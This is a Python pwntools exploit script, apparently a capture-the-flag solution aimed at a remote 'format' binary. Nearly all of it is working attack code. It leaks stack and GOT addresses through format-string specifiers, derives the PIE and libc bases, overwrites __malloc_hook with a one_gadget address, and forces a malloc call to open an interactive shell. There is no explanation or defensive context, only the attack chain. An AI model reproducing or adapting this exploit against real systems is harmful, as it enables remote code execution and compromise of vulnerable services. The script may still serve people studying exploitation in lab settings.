#!/bin/python3

from pwn import *

context.clear(arch="amd64")

HOST = "178.128.40.63"
PORT = 32475

#-------------------------------
def com(payload, wait=True):
	global sh
	sh.sendline(payload)
	if(wait):
		return sh.recv()



def nonStopLeak():
	data = []
	min_val = 1
	max_val = 40
	log.progress("Starting nonStopLeaking (range: %d to %d)..." % (min_val, max_val))
	data.append("EMPTY ON PURPOSE")
	for i in range(min_val,max_val):
		leak = "%{}$lx".format(i)
		leak = com(leak).strip().decode()
		data.append(leak)
	log.success("nonStopLeaking finalized...")
	return data

def clearGadgets(gadgets):
    clean = []
    for l in gadgets:
        if("0x" in l[:2]):
            clean.append(l.split(" ", 1)[0])
    return clean

#--------------------------------

sh = remote(HOST,PORT)
elf = ELF("format")

#sh = process("./format")

print("\n\n")

# Launch the fmtstr exploiter
exploiter = FmtStr(com)

collected_data = nonStopLeak()
print(collected_data)
pie_offset = 0x126d
printf_base = elf.got["printf"]
elf_stack_addr = collected_data[37]

# base value from offset (PIE_LEAK_ADDR[37] - 0x126d)
log.progress("ELF addr leak  @ pos34-%s" % hex(pie_offset))
pie_leak = int(elf_stack_addr, 16) - pie_offset 
elf.address = pie_leak

log.success("Elf base address: %s" % hex(elf.address))
rop = ROP(elf)

printf_got = elf.got["printf"]

payload = b"AAAAAAAAAA%8$s: " + p64(printf_got)

log.critical("Sending payload")
data = com(payload)[10:].split(b":")[0]
log.progress("Response received")
printf_leak = u64(data.ljust(8, b"\x00"))
log.success("Printf address leaked @ %s" % hex(printf_leak))

do_reload = True
while do_reload:
	do_reload = False
	log.critical("Place the libc in folder with name: libc.so")
	input("< Press any key to continue >")
	libc = ELF("libc.so")
	log.critical("libc LOADED")

	# get addresses
	#libc.address = stderr_leak - libc.symbols[stderr_leak_desc]
	libc.address = printf_leak - libc.symbols["printf"]
	__free_hook_addr = libc.symbols["__free_hook"]
	__malloc_hook_addr = libc.symbols["__malloc_hook"]

	log.info("libc base address @ %s" % hex(libc.address))
	log.info("__free_hook address @ %s" % hex(__free_hook_addr))
	log.info("__malloc_hook address @ %s" % hex(__malloc_hook_addr))
	#get one_gadget's and clean output
	keep_going = True
	do_auto = False

	gadget = []
	while keep_going:
		gadget.append(input("Insert the desired one_gadget [(Q)uit, (R)eload, (A)uto]: ").strip())
				
		if(gadget[0] == "Q" or gadget[0] == "q"):
			log.critical("Quiting...")
			keep_going = False
		elif(gadget[0] == "R" or gadget[0] == "r"):
			do_reload = True
			log.critical("Reloading libc")
			keep_going = False
		elif (gadget[0] == "A" or gadget[0] == "a"):
			do_auto = True            
		
		if(not keep_going):
			break
		
		#build symbols and try for it
		if(do_auto):
			gadgets = subprocess.check_output(['one_gadget', "libc.so"]).decode().split("\n")
			gadget = clearGadgets(gadgets)
			keep_going = False
			print(gadget)

		for g in gadget:
			g_val = int(g, 16) + libc.address
			ans = input("Use gadget: %s (%s)??? [(Y)es,(N)o]" % (g, hex(g_val))).strip()

			if(ans == "Y" or ans == "y"):
				payload = fmtstr_payload(exploiter.offset, {__malloc_hook_addr : g_val})
				#log.progress("Sending payload")
				com(payload)
				sleep(1)
				payload = '%100000c'
				com(payload, False)
				#log.progress("Going interactive")
				sh.interactive()

	ans = input("Do another libc? (Y)es/(N)o  ").strip()
	if(ans == "Y" or ans == "y"):
		do_reload = True